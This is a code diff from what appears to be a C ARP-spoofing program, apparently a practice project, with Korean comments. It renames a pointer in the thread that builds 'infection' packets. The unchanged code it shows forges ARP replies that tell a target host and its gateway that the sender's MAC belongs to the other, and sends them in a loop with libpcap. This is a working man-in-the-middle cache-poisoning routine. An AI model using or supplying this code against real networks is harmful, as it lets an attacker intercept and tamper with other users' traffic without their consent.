@@ -7,7 +7,7 @@ void *thread_infect(void *arg) //감염패킷킷
     char errbuf[PCAP_ERRBUF_SIZE];
     pcap_t *pcap_handle = pcap_open_live("enp0s3", BUFSIZ, 1, 1, errbuf);
 
-    struct infect_addr_save *addr_save = (struct infect_addr_save *)arg;
+    struct infect_addr_save *infect_addr_save = (struct infect_addr_save *)arg;
 
     u_char pkt[PACKETSIZE];
     struct eth_arp_header *infect = (struct eth_arp_header *)pkt;
@@ -24,11 +24,10 @@ void *thread_infect(void *arg) //감염패킷킷
 
         if (sw == 1)
             for (int i = 0; i <= 5; i++)
-                infect->eth_dst_mac[i] = addr_save->save_target_mac[i]; //목적지 받은 패킷의 시작 주소
+                infect->eth_dst_mac[i] = infect_addr_save->save_target_mac[i]; //목적지 받은 패킷의 시작 주소
         else
             for (int i = 0; i <= 5; i++)
-                infect->eth_dst_mac[i] = addr_save->save_gateway_mac[i];
-        printf("\n");
+                infect->eth_dst_mac[i] = infect_addr_save->save_gateway_mac[i];
         // smac --------------------------------------------
 
         for (int i = 0; i <= 5; i++)
@@ -45,23 +44,22 @@ void *thread_infect(void *arg) //감염패킷킷
             infect->arp_sender_mac[i] = mymac[i];
         // 공격 대상의 IP (게이트웨이)
         if (sw == 1)
-            infect->arp_sender_ip = addr_save->save_gateway_ip;
+            infect->arp_sender_ip = infect_addr_save->save_gateway_ip;
         else
-            infect->arp_sender_ip = addr_save->save_target_ip;
+            infect->arp_sender_ip = infect_addr_save->save_target_ip;
 
         // 속일 mac 주소 (감염시킬 pc의 주소)
         if (sw == 1)
             for (int i = 0; i <= 5; i++)
-                infect->arp_target_mac[i] = addr_save->save_target_mac[i]; //받은 패킷의 시작 주소
+                infect->arp_target_mac[i] = infect_addr_save->save_target_mac[i]; //받은 패킷의 시작 주소
         else
             for (int i = 0; i <= 5; i++)
-                infect->arp_target_mac[i] = addr_save->save_gateway_mac[i];
+                infect->arp_target_mac[i] = infect_addr_save->save_gateway_mac[i];
 
-        // inet_aton(addr_save->save_target_ip,&s_packet->arp_target_ip);  // 감염시키려는 ip 주소
         if (sw == 1)
-            infect->arp_target_ip = addr_save->save_target_ip;
+            infect->arp_target_ip = infect_addr_save->save_target_ip;
         else
-            infect->arp_target_ip = addr_save->save_gateway_ip;
+            infect->arp_target_ip = infect_addr_save->save_gateway_ip;
 
         int res = pcap_sendpacket(pcap_handle, pkt, sizeof(pkt));
         sw += 1;
